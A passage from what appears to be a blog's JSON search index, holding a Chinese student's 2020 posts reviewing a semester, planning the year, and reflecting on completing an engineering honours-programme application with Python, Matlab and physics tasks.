\u2714\u7ecf\u6d4e\u6cd5\u5408\u540c\u4f5c\u4e1a \u2714\u5de5\u4f5c\u7ec4\u4e3b\u9898\u63a8\u6587 \u2714\u5b66\u6587\u6d3b\u52a8\u63a8\u6587 \u2714\u5cf0\u4f1a\u5e72\u4e8b\u7ade\u9009 \u2714\u82f1\u8bed\u5f71\u8bc4 \u2714\u8fd0\u52a8\u4e0e\u8111\u4e2a\u4eba\u4f5c\u4e1a \u2714\u90e8\u95e8\u5723\u8bde\u5185\u5efa\u7b56\u5212 \u2714\u7ba1\u7406\u6c9f\u901a\u5c0f\u7ec4\u4f5c\u4e1a \u2714\u7ba1\u7406\u6c9f\u901a\u4e2a\u4eba\u4f5c\u4e1a \u2714\u63a8\u6587\u7ec4\u65e5\u5e38\u63a8\u6587 \u2714\u8fc7\u5e74\u4e91\u5cf0\u65b9\u9635\u6392\u7ec3 \u2714\u5fae\u79ef\u5206\u6155\u8bfe\u6d4b\u8bd5 \u2714\u7ebf\u4ee3\u6155\u8bfe\u6d4b\u8bd5 \u2714\u7ba1\u7406\u6c9f\u901a\u8bfe\u5802\u671f\u672b\u8003\u590d\u4e60 \u2714\u671f\u672b\u590d\u4e60\uff08\u5927\u82f1\u3001\u8fd0\u52a8\u4e0e\u8111\u3001\u5fae\u79ef\u5206\u3001C\u7a0b\u3001\u7ebf\u4ee3\u3001\u601d\u4fee\u3001\u7ecf\u6d4e\u6cd5\uff09 \u603b\u5f97\u6765\u8bf4\uff0c\u5356\u529b\u5212\u6868\uff0c\u539f\u5730\u6253\u8f6c\u3002\u4e0d\u8fc7\u4e5f\u5e76\u975e\u6beb\u65e0\u6536\u83b7\uff0c\u5927\u6982\u4e5f\u660e\u786e\u4e86\u4e8e\u81ea\u5df1\u800c\u8a00\uff0c\u54ea\u4e9b\u4e1c\u897f\u5177\u6709\u66f4\u9ad8\u7684\u4f18\u5148\u7ea7\u548c\u91cd\u8981\u6027\u3002\u6709\u559c\u6709\u5fe7\uff0c\u4e0d\u8fc7\u4eba\u4e4b\u5e38\u60c5\uff1b\u60a3\u5f97\u60a3\u5931\uff0c\u4e5f\u56e0\u5fc3\u4e2d\u6709\u7684\u3002","title":"\u8fc7\u53bb\u534a\u5e74\u7684\u56de\u987e"},{"location":"legacy/old_blog/20200309/#0202","text":"","title":"\u5c55\u671b0202\u8fd9\u4e00\u5e74"},{"location":"legacy/old_blog/20200309/#_4","text":"\u9996\u5148\uff0c\u5f53\u7136\u662f\u6700\u7d27\u8981\uff08\u8981\u547d\u7684\u5b66\u4e1a\u65b9\u9762\uff0c\u7531\u4e8e\u4e0a\u5b66\u671f\u56e0\u8fc7\u591a\u5b66\u5206\u5bfc\u81f4\u7cbe\u529b\u5206\u6563\u800c\u7f8e\u4e2d\u4e0d\u8db3\uff0c\u6240\u4ee5\u8fd9\u5b66\u671f\uff0c\u6211\u5728\u5b66\u5206\u65b9\u9762\u7ed9\u81ea\u5df1\u7559\u6709\u8f83\u5927\u7684\u8c03\u8282\uff08\u73a9\u800d\u7a7a\u95f4\uff0c\u4f46\u662f\u6c34\u8bfe\u53d8\u5c11\uff0c\u5176\u5b9e\u4e5f\u548c\u4e0a\u5b66\u671f\u534a\u65a4\u516b\u4e24\u3002\u603b\u4e4b\uff0c\u4e00\u4e2a\u65b9\u9488\u2014\u2014\u786c\u8bfe\u7a33\u4e00\u624b\uff0c\u6c34\u8bfe\u5077\u4e00\u628a\u3002\u7531\u4e8e\u53cc\u98de\u53f2\u7eb2\u548c\u9a6c\u539f\uff0c\u96be\u514d\u4f1a\u9677\u5165\u9e45\u9888\u7684\u6ce5\u6dd6\uff0c\u5f97\u6ce8\u610f\u7406\u667a\u51b7\u9759\u5730\u809d\u3002\u4fdd\u6301\u7a33\u5b9a\u5427\uff0c\u5176\u4ed6\u4e5f\u5c31\u8fd9\u6837\u3002 \u5bf9\u4e8e\u8f85\u4fee\u4e4b\u7c7b\uff0c\u9274\u4e8e\u8f85\u4fee\u7684\u6beb\u65e0\u5b58\u5728\u611f\uff0c\u51b3\u5b9a\u53bb\u8bd5\u8bd5\u5de5\u9ad8\u73ed\u3002\uff08\u8349\u7387\u5730\u77ac\u95f4\u505a\u51b3\u5b9a","title":"\u8bfe\u4e1a"},{"location":"legacy/old_blog/20200309/#_5","text":"\u7ec4\u7ec7\u65b9\u9762\uff0c\u5b66\u751f\u4f1a\u7684\u6d3b\u52a8\u7531\u4e8e\u67d0\u4e9b\u4e0d\u53ef\u63a7\u56e0\u7d20\uff08\u9886\u5bfc\u6e05\u5947\u7684\u8111\u56de\u8def\u548c\u538b\u69a8\u76f4\u63a5\u88ab\u53d6\u6d88\uff0c\u4f30\u6478\u7740\u63a5\u4e0b\u6765\u4e5f\u5c31\u662f\u4e00\u4e9b\u5c0f\u63a8\u6587\u5de5\u4f5c\u548c\u7559\u4efb\u5de5\u4f5c\uff0c\u521d\u6b65\u8ba1\u5212\u62d2\u7edd\u7559\u4efb\uff0c\u867d\u7136\u8bf4\u5f53\u4ec1\u4e0d\u8ba9\uff0c\u4f46\u662f\u4eba\u5404\u6709\u5fd7\u5427\u3002\u56e2\u5de5\u59d4\u65b9\u9762\uff0c\u5e94\u8be5\u8fd8\u6709\u4e00\u4e2a\u5ef6\u671f\u7684\u5b66\u751f\u52a9\u7406\u57f9\u8bad\u4f1a\u8bae\u7684\u9879\u76ee\u548c\u65e5\u5e38\u503c\u73ed\uff0818r/h\u7684\u5ec9\u4ef7\u52b3\u52a8\u529b\uff0c\u4e5f\u4e0d\u7559\u4efb\u3002 \u793e\u56e2\u65b9\u9762\uff0c\u4fbf\u662f\u5d4c\u5165\u5f0f\u4eba\u5de5\u667a\u80fd\u793e\u56e2\uff0c\u4e0a\u4e2a\u5b66\u671f\u5f00\u5b66\u7684\u5934\u8111\u4e00\u70ed\u52a0\u5165\u7684orz\u3002\u4e0a\u5b66\u671f\u5185\u8bad\u7684Torch\u3001OpenCV\u65e9\u5df2\u88ab\u629b\u4e4b\u8111\u540e\uff0c\u8fc7\u4e8e\u6c34\u7684\u540e\u679c\u5c31\u662f\u8fd9\u5b66\u671f\u7684\u70b8\u88c2\u3002\u61a8\u61a8\u5982\u6211\uff0c\u9519\u8fc7\u4f8b\u4f1a\u88ab\u81ea\u52a8\u5206\u914d\u4efb\u52a1\uff0c\u7adf\u7136\u662f\u6211\u4ece\u672a\u63a5\u89e6\u8fc7\u7684\u6811\u8393\u6d3e/STM32\u3002\u6682\u4e14\u5148\u81ea\u5b66\u7740\u5427\uff0c\u53cd\u6b63\u662f\u793e\u56e2\uff0c\u5927\u4e0d\u4e86\u5495\u5495\u5495\uff08\u9003\u3002 \u5de5\u4f5c\u8ba1\u5212 \u4e91\u5cf0\u5b66\u751f\u4f1a \u7559\u4efb\u5de5\u4f5c \u65e5\u5e38\u63a8\u6587 \u56e2\u5de5\u59d4 \u65e5\u5e38\u503c\u73ed \u5b66\u751f\u52a9\u7406\u57f9\u8bad\u4f1a\u8bae \u7559\u4efb \u5d4c\u5165\u5f0f\u4eba\u5de5\u667a\u80fd\u793e\u56e2 \u590d\u4e60\u5185\u8bad\u5185\u5bb9 Matplotlib Numpy Torch OpenCV \u5b8c\u6210\u6811\u8393\u6d3e/STM32\u63a8\u6587 \u505a\u5c0f\u7ec4\u9879\u76ee","title":"\u5de5\u4f5c"},{"location":"legacy/old_blog/20200309/#_6","text":"","title":"\u4e1a\u4f59"},{"location":"legacy/old_blog/20200309/#_7","text":"\u8fd9\u4e00\u7c7b\u4e8b\u60c5\u5c31\u662f\u90a3\u79cd\u8ba1\u5212\u548c\u5b8c\u6210\u6bd4\u5de8\u9ad8\u7684\uff0c\u6bcf\u6b21\u90fd\u4ee4\u81ea\u5df1\u61ca\u6094\u7684\u3002\u867d\u7136\u5982\u6b64\uff0c\u8ba1\u5212\u8fd8\u662f\u8981\u6709\u7684 TODO IMPORTANCE DS \u4e2d TOEFL \u9ad8 Blog \u4f4e Project \u4f4e Reading \u4e2d","title":"\u975e\u9893\u5e9f\u4e4b\u4e8b"},{"location":"legacy/old_blog/20200309/#_8","text":"\u867d\u7136\u662f\u4e00\u70b9\u7a7a\u865a\u7684\u5feb\u4e50\uff0c\u4f46\u662f\u4e5f\u662f\u4eba\u751f\u5fc5\u4e0d\u53ef\u5c11\u7684\u5185\u5bb9\uff0c\u5728\u60c5\u611f\u4e0a\u5177\u6709\u66f4\u9ad8\u7684\u4ef7\u503c\u548c\u610f\u4e49\u5427\u3002 \u4f19\u4f34\u90ca\u6e38 \u534a\u591c\u72c2\u6b22 \u3002\u3002\u3002\uff08\u597d\u53ed\uff0c\u60f3\u4e0d\u51fa\u6765\u4e86\uff0c\u53cd\u6b63high\u5c31\u5bf9\u4e86\uff09","title":"\u5815\u843d\u5427"},{"location":"legacy/old_blog/20200309/#_9","text":"\u788e\u788e\u5ff5\u4e86\u8fd9\u4e48\u4e45\uff0c\u4e5f\u4e0d\u77e5\u4e91\u4e91 \u4e3b\u8981\u662f\u642d\u5efa\u4e86\u4e00\u4e2aBlog\uff0c\u603b\u4e0d\u80fd\u8ba9\u5b83\u7a7a\u7a7a\u5982\u4e5f\uff0c\u6240\u4ee5\u5c31\u4e92\u62fc\u4e71\u51d1\u5730\u5148\u5199\u4e00\u7bc7\u6491\u6491\u573a\u9762\uff0c\u8fd8\u5f97Blog\u8981\u7d20\u5168\u4e86\u3002\u54c8\u54c8\u54c8\uff01 \u7adf\u7136\u5199\u4e86\u90a3\u4e48\u4e45\uff0c\u4e3b\u8981\u4e2d\u95f4\u5404\u79cd\u4e8b\u60c5\u5c42\u51fa\u4e0d\u7a77\uff0c\u5207\u8bb0\uff0c\u4e00\u5fc3\u4e0d\u53ef\u591a\u7528\u554a\uff01 2020.3.9 21:45","title":"\u5199\u5728\u6587\u672b"},{"location":"legacy/old_blog/20200318/","text":"\u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3 \u00b6 \u7ea6 1475 \u4e2a\u5b57 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f Abstract \u672c\u6587\u5199\u4e8e2020\u5e743\u670818\u65e5\uff0c\u73b0\u4f5c\u6574\u7406\u6536\u5f55\u3002 \u5de5\u9ad8\u73ed \uff0c\u5168\u540d\u5de5\u7a0b\u6559\u80b2\u7ba1\u7406\u9ad8\u7ea7\u73ed\uff08ACEE\uff09\uff0c\u662f\u7afa\u53ef\u6862\u5b66\u9662\u5f00\u8bbe\u7684\u4e00\u4e2a\u8f85\u4fee\u73ed\uff0c\u6709\u8fc7\u9ad8\u7ee9\u70b9\u73ed\u7b49\u5916\u53f7\uff0c\u5f53\u7136\u4e5f\u6709\u8fc7int ia ic ie\u7684\u4e11\u95fb(\u6ed1\u7a3d \uff0c\u5177\u4f53\u53ef\u4ee5\u81ea\u884c\u641c\u7d22\u3002 \u8003\u8651\u5230\u6709\u4eba\u4e0d\u77e5\u9053\u4ec0\u4e48\u662f\u5de5\u9ad8\u73ed\uff0c\u6240\u4ee5\u5728\u5f00\u5934\u89e3\u91ca\u4e00\u4e0b\u3002 \u8d77\u6e90 \u00b6 \u7531\u4e8e\u6211\u4e0a\u4e00\u5468\u7684\u4e34\u65f6\u8d77\u610f\uff0c\u6240\u4ee5\u8d76\u9e2d\u5b50\u4e0a\u67b6\u5730\u53c2\u52a0\u4e86\u5de5\u9ad8\u73ed\u7684\u62a5\u540d\u3002\u4e8e\u662f\u5728\u4e0a\u5468\u4e09\uff0c\u6211\u5174\u51b2\u51b2\u5730\u53bb\u4e0b\u8f7d\u4e86\u62a5\u540d\u8868\u4ece\u6b64\u8d70\u4e0a\u4e86\u4e00\u6761\u4e0d\u5f52\u8def\u3002\u8fd9\u662f\u4e00\u4efd\u5bb9\u91cf\u6781\u5927\u7684\u62a5\u540d\u8868\uff0c\u6211\u6574\u6574\u82b1\u4e86\u534a\u4e2a\u5c0f\u65f6\u9605\u8bfb\u6574\u4e00\u4efd\u62a5\u540d\u8868\uff0c\u5176\u4e2d\u5927\u6982\u6db5\u76d6\u4e86\u827a\u672f\u5ba1\u7f8e\u3001\u6570\u7406\u57fa\u7840\u3001\u7f16\u7a0b\u601d\u7ef4\u7b49\u4e00\u7cfb\u5217\u5185\u5bb9\u3002\u867d\u7136\u8bf4\uff0c\u96be\u5ea6\u4e0d\u662f\u9ad8\u5230\u4e00\u5b9a\u7a0b\u5ea6\uff0c\u4f46\u662f\u5168\u65b0\u7684\u5185\u5bb9\u8fd8\u662f\u9700\u8981\u5f88\u9ad8\u7684\u5b66\u4e60\u65f6\u95f4\u6210\u672c\uff0c\u6240\u4ee5\u4e00\u5468\u7684\u65f6\u95f4\u4e5f\u662f\u5341\u5206\u5403\u7d27\u7684\uff0c\u6bd5\u7adf\u8fd8\u6709\u65e5\u5e38\u7684\u5b66\u4e1a\u5212\u6c34\u4efb\u52a1\u3002 \u81ea\u5df1\u9009\u62e9\u7684\u8def\uff0c\u722a\u5df4\u4e5f\u8981\u8d70\u5b8c\u3002 \u8fd9\u4e00\u4e2a\u793c\u62dc\u4ee5\u6765\uff0c\u6211\u7684\u65e5\u5e38\u751f\u6d3b\u5c31\u9677\u4e8e\u8d77\u5e8a\u2014\u2014\u505a\u8868\u2014\u2014\u4e0a\u8bfe\u2014\u2014\u4e0b\u8bfe\u2014\u2014\u505a\u8868\u2014\u2014\u8fdb\u98df\u2014\u2014\u505a\u8868\u2014\u2014\u7761\u89c9\u2014\u2014\u8d77\u5e8a\u7684\u65e0\u9650\u5faa\u73af\u4e4b\u4e2d\uff0c\u50cf\u662f\u4e00\u4e2a\u6ca1\u6709\u611f\u60c5\u7684\u673a\u5668\uff08\u4e3b\u8981\u8fd8\u662f\u6211\u592a\u83dc\u4e86\u3002\u4e0d\u7ba1\u7ed3\u679c\u5982\u4f55\uff0c\u6bd5\u7adf\u6211\u7ec8\u4e8e\u5b8c\u6210\u80e1\u7f16\u4e71\u9020\u4e86\u62a5\u540d\u8868\u5e76\u4e14\u63d0\u4ea4\u4e86\uff0c\u6240\u4ee5\u6211\u8fd8\u662f\u60f3\u8be6\u7ec6\u5730\u6765\u8bf4\u8bf4\u505a\u9898\u65f6\u7684\u5177\u4f53\u611f\u53d7\u3002 \u5bf9\u4e8e\u9898\u76ee\u5177\u4f53\u5206\u6790\u548c\u76f8\u5173\u77e5\u8bc6\uff0c\u6211\u60f3\u6211\u5927\u6982\u4e5f\u8bb8\u53ef\u80fd\u4f1a\u5199\u4e00\u4e2a\u7cfb\u5217\u8be6\u7ec6\u4ecb\u7ecd\u5427\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e3b\u8981\u8bf4\u8bf4\u611f\u53d7\uff0c\u77e5\u8bc6\u6027\u53ef\u80fd\u4e0d\u4e00\u5b9a\u5f88\u5f3a\u3002 \u521d\u5165\u70bc\u72f1 \u00b6 \u6d4f\u89c8\u4e86\u4e00\u904d\u62a5\u540d\u8868\u540e\uff0c\u6211\u5927\u6982\u5c06\u62a5\u540d\u8868\u5206\u6210\u4ee5\u4e0b\u51e0\u4e2a\u90e8\u5206\u3002 \u9898\u76ee\u5217\u8868 Module 1 Task 1\uff1aStory Board Task 2\uff1aAffective Diary Module 2 Section 1\uff1aMatlab Tilted Photos Image Processing Section 2 SolidWorks Multisim Python Assembly Section 3 Math in Epidemic Lagrangian Function in Physics Chemistry and Engineering \u5177\u4f53\u7684\u8981\u6c42\u662f\u5728Module 1\u4e2d\u9009\u62e9\u4e00\u4e2aTask\u5b8c\u6210\uff0c\u540c\u65f6\u8981\u6c42\u5b8c\u6210Module 2\u4e2d\u6bcf\u4e2aSection\u4e2d\u7684\u4e00\u9053\u9898\uff0c\u6240\u4ee5\u603b\u5171\u9700\u8981\u5b8c\u6210\u56db\u9053\u9898\uff0c\u63a5\u4e0b\u6765\u6211\u5c06\u4ee5\u6211\u7684\u7b54\u9898\u987a\u5e8f\u6765\u8bb2\u8bb2\u6211\u505a\u9898\u4e2d\u7684\u611f\u53d7\u548c\u60f3\u6cd5\u3002 \u7f13\u6162\u524d\u8fdb \u00b6 Python \u00b6 \u6211\u4e4b\u6240\u4ee5\u9009\u62e9Python\u5165\u624b\uff0c\u539f\u56e0\u662f\u5728\u90a3\u4e48\u591a\u9898\u4e2d\u6211\u76f8\u5bf9\u6bd4\u8f83\u719f\u6089\u3002\u800c\u4e14\u4ece\u8fd9\u6b21\u9898\u76ee\u4e2d\u6765\u770b\uff0c\u8fd9\u662f\u4e00\u9053\u76f8\u5bf9\u6bd4\u8f83\u7b80\u5355\u7684\u9898\uff0c\u53ea\u8981\u6c42\u4f60\u901a\u8fc7Pygame\u6765\u5b9e\u73b0\u4e00\u4e2a\u5b83\u6240\u8981\u6c42\u7684\u5c0f\u6e38\u620f\u5373\u53ef\u3002\u5c31\u6211\u4e2a\u4eba\u611f\u53d7\u800c\u8a00\uff0c\u6574\u4f53\u96be\u5ea6\u4e0d\u5927\uff0c\u7b97\u6cd5\u8981\u6c42\u4e0d\u9ad8\uff0c\u4e00\u822c\u6765\u8bf4\u51e0\u4e2a\u5c0f\u65f6\u5c31\u80fd\u5b8c\u6210\uff0c\u6240\u4ee5\u6211\u4e5f\u4e0d\u518d\u8d58\u8ff0\uff0c\u7b49\u4ee5\u540e\u7cfb\u5217\u535a\u6587\u91cc\u518d\u63d0\u5427\u3002\u53e6\u5916\uff0c\u628a\u5b83\u653e\u5728\u6700\u5148\u505a\uff0c\u8fd8\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u63a8\u52a8\u6211\u53bb\u505a\u8868\uff0c\u4e00\u662f\u56e0\u4e3a\u589e\u5f3a\u4e86\u4fe1\u5fc3\uff0c\u4e8c\u662f\u6709\u4e86\u96be\u4ee5\u653e\u5f03\u7684\u6c89\u6ca1\u6210\u672c\uff0c\u563f\u563f\u3002 Matlab\uff1aTilted Photos \u00b6 \u8fd9\u9053\u9898\uff0c\u771f\u7684\u662f\u628a\u6211\u521a\u521a\u4ecePython\u5efa\u7acb\u8d77\u7684\u4fe1\u5fc3\u5f7b\u5f7b\u5e95\u5e95\u7684\u6253\u57ae\u4e86\u3002\u867d\u7136\u8bf4\u4e0a\u5b66\u671f\u6211\u65e9\u5c31\u628aMatlab\u5b89\u88c5\u4e86\uff0c\u4f46\u9876\u591a\u7528\u6765\u89e3\u89e3\u6570\u5b66\u9898\u4e4b\u7c7b\uff0c\u81f3\u4e8e\u5176\u4ed6\uff0c\u751a\u81f3\u5b83\u672c\u8eab\u7684\u8bed\u6cd5\u90fd\u4e0d\u592a\u4e86\u89e3\uff0c\u4f46\u4e5f\u53ea\u80fd\u786c\u7740\u5934\u76ae\u4e0a\u3002\u66f4\u52a0\u8ba9\u4eba\u5954\u6e83\u7684\u662f\uff0c\u5b83\u8981\u6c42\u4e0d\u80fd\u4f7f\u7528Matlab\u672c\u8eab\u63d0\u4f9b\u7684\u51fd\u6570\u6216\u8005Toolbox\u6765\u89e3\u51b3\u5173\u952e\u6b65\u9aa4\uff0c\u6362\u4e00\u53e5\u8bdd\u8bf4\uff0c\u5c31\u662f\u5173\u952e\u7b97\u6cd5\u8981\u81ea\u5df1\u53bb\u60f3\u3002\u6700\u540e\uff0c\u6211\u82b1\u4e86\u8fd1\u4e24\u5929\u65f6\u95f4\u5b66\u4e60\u4e86Matlab\u4ee5\u53ca\u6709\u5173\u56fe\u50cf\u5904\u7406\u8bc6\u522b\u7684\u4e00\u90e8\u5206\u77e5\u8bc6\uff0c\u624d\u52c9\u52c9\u5f3a\u5f3a\u5730\u5b8c\u6210\u4e86\u5b83\u4e00\u90e8\u5206\u7684\u8981\u6c42\u3002 \u6700\u540e\u5173\u4e8e\u795e\u7ecf\u7f51\u7edc\u90e8\u5206\uff0c\u7531\u4e8e\u65f6\u95f4\u539f\u56e0\uff0c\u6211\u662f\u6ca1\u6709\u5b8c\u6210\u7684\uff0c\u4e0d\u8fc7\u540e\u7eed\u6211\u4f1a\u8ddf\u8fdb\u5b66\u4e60\uff0c\u5e94\u8be5\u4f1a\u53d1\u5b66\u4e60\u535a\u6587\u7684\u5427\u3002\u603b\u4f53\u6765\u8bf4\uff0c\u6211\u5bf9\u81ea\u5df1\u8fd8\u662f\u6bd4\u8f83\u6ee1\u610f\u7684\uff0c\u6bd5\u7adf\u6211\u4e0d\u662f\u5927\u4f6c\uff0c\u53ea\u662f\u4e00\u4e2a\u5c0f\u83dc\u9e21\uff0c\u54b8\u9c7c\u53ef\u662f\u5f88\u5bb9\u6613\u81ea\u6211\u6ee1\u8db3\u7684~\uff0845\u5ea6\u4ef0\u671b\u5927\u4f6corz Lagrangian Function in Physics \u00b6 \u4ece\u5185\u5bb9\u4e0a\u6765\u770b\u5e94\u8be5\u662f\u4e00\u9053\u7406\u8bba\u7269\u7406\u9898\uff0c\u6beb\u65e0\u57fa\u7840\u7684\u6211\u5bf9\u7740\u76f8\u5173\u77e5\u8bc6\u8fdb\u884c\u4e00\u6ce2\u56eb\u56f5\u541e\u67a3\uff0c\u52c9\u5f3a\u4f5c\u51fa\u4e86\u4e00\u90e8\u9898\u76ee\uff0c\u4e0d\u8fc7\u540e\u9762\u9047\u5230\u4e86\u65e0\u6cd5\u63a5\u7684\u591a\u5143\u5fae\u5206\u65b9\u7a0b\u7ec4\u7684\u95ee\u9898\uff0c\u4e8e\u662f\u5c31\u96be\u4ee5\u8fdb\u884c\u4e0b\u53bb\u3002\u6211\u4e2a\u4eba\u5176\u5b9e\u5bf9\u8fd9\u9053\u9898\u633a\u9057\u61be\u7684\uff0c\u6bd5\u7adf\u611f\u89c9\u5c31\u5dee\u4e00\u70b9\u70b9\uff0c\u7b97\u4e86\uff0c\u90fd\u8fc7\u53bb\u4e86\u3002\u672c\u6765\u5c31\u662f\u4e34\u65f6\u5b66\u7684\uff0c\u57fa\u7840\u5565\u4e5f\u6ca1\u6709\uff0c\u5c31\u8fd9\u6837\u5427\u3002 Affective Diary \u00b6 \u8fd9\u4e00\u90e8\u5206\u5c31\u6bd4\u8f83\u7b80\u7b54\u4e86\uff0c\u7531\u4e8e\u8003\u5bdf\u7684\u662f\u827a\u672f\u5ba1\u7f8e\u548c\u4eba\u6587\u7d20\u517b\uff0c\u6240\u4ee5\u5927\u6982\u5c31\u662f\u5f88\u7384\u5b66\u5427\u3002\u5148\u8981\u6c42\u53bb\u8bfb\u4e00\u7bc7\u82f1\u6587\u8bba\u6587\uff08\u597d\u50cf\u662f\u5fae\u8f6f\u7814\u7a76\u9662\u7684\uff0c\u4e0d\u8fc7\u4e2a\u4eba\u611f\u89c9\u6ca1\u5565\u5e2e\u52a9\u3002\u4e4b\u540e\u4fbf\u662f\u8981\u6c42\u5236\u4f5c\u4e00\u4efd\u5c5e\u4e8e\u81ea\u5df1\u7684Affective Diary\uff0c\u624b\u7ed8\u3001\u7535\u8111\u5236\u56fe\u90fd\u884c\u3002\u6211\u9009\u62e9\u4e86\u7528Ps\uff0c\u6700\u6df1\u7684\u611f\u53d7\u5c31\u662f\uff0c\u6211\u5bf9\u7f8e\u672f\u5b8c\u4e86\uff01\uff01\uff01\u505a\u5230\u8fd9\u91cc\u6211\u5df2\u7ecf\u4f5b\u7cfb\u4e86\uff0c\u4e00\u5207\u968f\u7f18\u7684\u6211\u5df2\u7ecf\u628a\u505a\u5b8c\u8868\u5f53\u4f5c\u76ee\u6807\u4e86\u3002\u8d28\u91cf\u4ec0\u4e48\u7684\u90fd\u4e00\u8fb9\u53bb\uff01 \u540e\u8bb0 \u00b6 \u867d\u7136\u8bf4\u622a\u6b62\u65f6\u95f4\u662f\u4eca\u5929\u65e9\u4e0a11:00\uff0c\u4e0d\u8fc7\u6211\u8fd8\u662f\u5728\u6628\u5929\u665a\u4e0a\u5c31\u7126\u8651\uff0c\u6bd5\u7adf\u65e9\u4ea4\u65e9\u8d85\u751f\uff0c\u5b9e\u9645\u4e0a\u662f\u56e0\u4e3a\u6211\u505a\u4e0d\u51fa\u6765\u4e86\u3002\u540e\u9762\u8fd8\u6709\u4e09\u8f6e\u7684\u8003\u6838\uff0c\u5982\u679c\u6211\u80fd\u82df\u8fdb\u540e\u9762\u51e0\u8f6e\u8003\u6838\uff0c\u6211\u4e5f\u4f1a\u5199\u76f8\u5173\u5185\u5bb9\u7684\uff08\u5c3d\u91cf\u3002 \u4e0d\u8fc7\u6709\u4e00\u8bf4\u4e00\uff0c\u6211\u8fd8\u662f\u5e0c\u671b\u7b2c\u4e00\u8f6e \u88ab\u5237\u4e5f\u4e0d\u8981\u6700\u540e\u4e00\u8f6e\u88ab\u5237\u3002 \u8fd8\u6709\uff0c\u6211\u53d1\u73b0\u8fd9\u6b21\u53ef\u80fd\u7531\u4e8e\u75ab\u60c5\u5728\u5bb6\u7684\u539f\u56e0\uff0c\u7adf\u7136\u53ea\u670987\u4eba\u53c2\u4e0e\u4e86\u62a5\u540d\uff0c\u5f55\u53d6\u7387\u9ad8\u8fbe46%\uff01\u4f46\u662f\u6211\u77e5\u9053\uff0c\u8fd9\u8fd8\u662f\u5927\u4f6c\u7684\u6218\u4e89\uff0c\u5927\u4f6c\u7684\u5e73\u5747\u6c34\u5e73\u2026\u2026. \u5bb3\uff0c\u4e0d\u8bf4\u4e86\uff0c\u6211\u8981\u597d\u597d\u4f11\u606f\u8c03\u6574\u4e00\u4e0b\u4e86zzzzzzzzzz","title":"\u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3"},{"location":"legacy/old_blog/20200318/#_1","text":"\u7ea6 1475 \u4e2a\u5b57 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f Abstract \u672c\u6587\u5199\u4e8e2020\u5e743\u670818\u65e5\uff0c\u73b0\u4f5c\u6574\u7406\u6536\u5f55\u3002 \u5de5\u9ad8\u73ed \uff0c\u5168\u540d\u5de5\u7a0b\u6559\u80b2\u7ba1\u7406\u9ad8\u7ea7\u73ed\uff08ACEE\uff09\uff0c\u662f\u7afa\u53ef\u6862\u5b66\u9662\u5f00\u8bbe\u7684\u4e00\u4e2a\u8f85\u4fee\u73ed\uff0c\u6709\u8fc7\u9ad8\u7ee9\u70b9\u73ed\u7b49\u5916\u53f7\uff0c\u5f53\u7136\u4e5f\u6709\u8fc7int ia ic ie\u7684\u4e11\u95fb(\u6ed1\u7a3d \uff0c\u5177\u4f53\u53ef\u4ee5\u81ea\u884c\u641c\u7d22\u3002 \u8003\u8651\u5230\u6709\u4eba\u4e0d\u77e5\u9053\u4ec0\u4e48\u662f\u5de5\u9ad8\u73ed\uff0c\u6240\u4ee5\u5728\u5f00\u5934\u89e3\u91ca\u4e00\u4e0b\u3002","title":"\u5de5\u9ad8\u62a5\u540d\u8868\u586b\u5199\u611f\u60f3"},{"location":"legacy/old_blog/20200318/#_2","text":"\u7531\u4e8e\u6211\u4e0a\u4e00\u5468\u7684\u4e34\u65f6\u8d77\u610f\uff0c\u6240\u4ee5\u8d76\u9e2d\u5b50\u4e0a\u67b6\u5730\u53c2\u52a0\u4e86\u5de5\u9ad8\u73ed\u7684\u62a5\u540d\u3002\u4e8e\u662f\u5728\u4e0a\u5468\u4e09\uff0c\u6211\u5174\u51b2\u51b2\u5730\u53bb\u4e0b\u8f7d\u4e86\u62a5\u540d\u8868\u4ece\u6b64\u8d70\u4e0a\u4e86\u4e00\u6761\u4e0d\u5f52\u8def\u3002\u8fd9\u662f\u4e00\u4efd\u5bb9\u91cf\u6781\u5927\u7684\u62a5\u540d\u8868\uff0c\u6211\u6574\u6574\u82b1\u4e86\u534a\u4e2a\u5c0f\u65f6\u9605\u8bfb\u6574\u4e00\u4efd\u62a5\u540d\u8868\uff0c\u5176\u4e2d\u5927\u6982\u6db5\u76d6\u4e86\u827a\u672f\u5ba1\u7f8e\u3001\u6570\u7406\u57fa\u7840\u3001\u7f16\u7a0b\u601d\u7ef4\u7b49\u4e00\u7cfb\u5217\u5185\u5bb9\u3002\u867d\u7136\u8bf4\uff0c\u96be\u5ea6\u4e0d\u662f\u9ad8\u5230\u4e00\u5b9a\u7a0b\u5ea6\uff0c\u4f46\u662f\u5168\u65b0\u7684\u5185\u5bb9\u8fd8\u662f\u9700\u8981\u5f88\u9ad8\u7684\u5b66\u4e60\u65f6\u95f4\u6210\u672c\uff0c\u6240\u4ee5\u4e00\u5468\u7684\u65f6\u95f4\u4e5f\u662f\u5341\u5206\u5403\u7d27\u7684\uff0c\u6bd5\u7adf\u8fd8\u6709\u65e5\u5e38\u7684\u5b66\u4e1a\u5212\u6c34\u4efb\u52a1\u3002 \u81ea\u5df1\u9009\u62e9\u7684\u8def\uff0c\u722a\u5df4\u4e5f\u8981\u8d70\u5b8c\u3002 \u8fd9\u4e00\u4e2a\u793c\u62dc\u4ee5\u6765\uff0c\u6211\u7684\u65e5\u5e38\u751f\u6d3b\u5c31\u9677\u4e8e\u8d77\u5e8a\u2014\u2014\u505a\u8868\u2014\u2014\u4e0a\u8bfe\u2014\u2014\u4e0b\u8bfe\u2014\u2014\u505a\u8868\u2014\u2014\u8fdb\u98df\u2014\u2014\u505a\u8868\u2014\u2014\u7761\u89c9\u2014\u2014\u8d77\u5e8a\u7684\u65e0\u9650\u5faa\u73af\u4e4b\u4e2d\uff0c\u50cf\u662f\u4e00\u4e2a\u6ca1\u6709\u611f\u60c5\u7684\u673a\u5668\uff08\u4e3b\u8981\u8fd8\u662f\u6211\u592a\u83dc\u4e86\u3002\u4e0d\u7ba1\u7ed3\u679c\u5982\u4f55\uff0c\u6bd5\u7adf\u6211\u7ec8\u4e8e\u5b8c\u6210\u80e1\u7f16\u4e71\u9020\u4e86\u62a5\u540d\u8868\u5e76\u4e14\u63d0\u4ea4\u4e86\uff0c\u6240\u4ee5\u6211\u8fd8\